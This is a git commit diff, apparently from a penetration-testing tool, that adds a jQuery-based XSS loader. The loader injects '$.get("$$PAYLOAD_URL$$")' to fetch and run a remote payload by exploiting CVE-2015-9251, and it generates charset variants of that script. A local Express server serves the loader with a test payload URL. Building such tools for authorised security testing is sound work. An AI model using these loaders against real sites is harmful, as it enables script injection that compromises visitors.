2a59c0fca028cf531cfc6b065cab646c46f757bf
Mic <mic@secureideas.com>
2019-06-29 11:41:45 -0400

    Added sample loader

--- loaders/jqueryGet.js
+++ loaders/jqueryGet.js
@@ -1,8 +1,11 @@
 const generateCharsets = require('../lib/generateCharsets')
-const script = '$.get($$PAYLOAD_URL$$)'
+const renderable = require('../lib/renderable')
+
+const script = '$.get("$$PAYLOAD_URL$$")'
+
 module.exports = {
     description: `Standard JQuery Get, depends on a version of JQuery with CVE-2015-9251`,
-    script: script,
+    script: renderable(script),
     charsets: generateCharsets(script)
 }
 
--- server.js
+++ server.js
@@ -2,33 +2,29 @@
 const express = require('express')
 const { resolve } = require('path')
 const _ = require('lodash')
-const loadScript = require('./lib/loadScript')
-const renderable = require('./lib/renderable')
 const listDir = require('./lib/listDir')
 
 const app = express()
 const port = 3000
 const getLoader = loadLoaders()
 
+const payloadUrl = 'http://localhost:3000/testPayload'
+
 app.get('/', (req, res) => {
     return res.send(
-      getLoader('soxfil')({ HOST: req.hostname })
+      getLoader('jqueryGet').script({ PAYLOAD_URL: payloadUrl })
     )
 })
 
-app.listen(port, () => console.log(`Example app listening on port ${port}!`))
+app.listen(port, () => console.log(`CSIK Server listening on port ${port}!`))
 
 function loadLoaders() {
   const loaders = listDir(
     resolve('./loaders/')).reduce(
       (payloads, file) => {
         return _.set(payloads, _.trimEnd(file, '.js'), 
-        renderable(
-          loadScript(
-            resolve(`./loaders/${file}`)
-          )
-      )
-    )
+          require(`./loaders/${file}`)
+        )
   }, {})
   return (key) => {
     return loaders[key]
